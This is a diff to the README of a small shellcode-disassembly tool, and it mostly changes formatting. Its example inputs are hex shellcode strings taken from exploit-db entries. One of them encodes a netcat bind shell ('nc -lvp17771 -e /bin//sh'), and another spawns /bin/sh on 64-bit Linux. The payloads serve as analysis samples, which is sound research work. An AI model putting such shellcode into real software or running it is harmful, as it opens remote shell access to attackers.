@@ -8,10 +8,12 @@ arch: defined as in objdump -m, default: i386
 <b>DISCLAIMER</b><br/>
 This tool is intended to be minimalistic.<br/>
 It may not give proper results in case of complicated/obfuscated shellcode. In such cases, please refer to tools of appropriate complexity.<br/>
-<i>If you still think, that I should develop this tool further, and make it a fully-fledged app, feel free to write me an e-mail :) [hasherezade-at-op.pl]</i><hr/>
+
 examples:
 -
-1) https://www.exploit-db.com/exploits/36921/<br/>
+
+1) https://www.exploit-db.com/exploits/36921/
+
 expdb1.shc :
 <pre>
 "\x31\xc0\x31\xd2\x50\x68\x37\x37\x37\x31\x68\x2d\x76\x70\x31\x89\xe6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x2d\x6c\x65\x2f\x89\xe7\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80";
@@ -20,7 +22,8 @@ expdb1.shc :
 ![](img/expdb1-32b.png)
 
 <br/><br/>
-2) https://www.exploit-db.com/exploits/36858/<br/>
+
+2) https://www.exploit-db.com/exploits/36858/
 expdb1_64.shc :
 <pre>
   char *shellcode =3D "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56=
@@ -28,7 +31,8 @@ expdb1_64.shc :
 </pre>
 
 <br/><br/>
-3) https://www.exploit-db.com/exploits/36637/<br/>
+
+3) https://www.exploit-db.com/exploits/36637/
 expdb3.shc :
 <pre>
 char shellcode[] = "\xeb\x22\x5b\x31\xc0\x88\x43\x23\x6a\x05\x58"
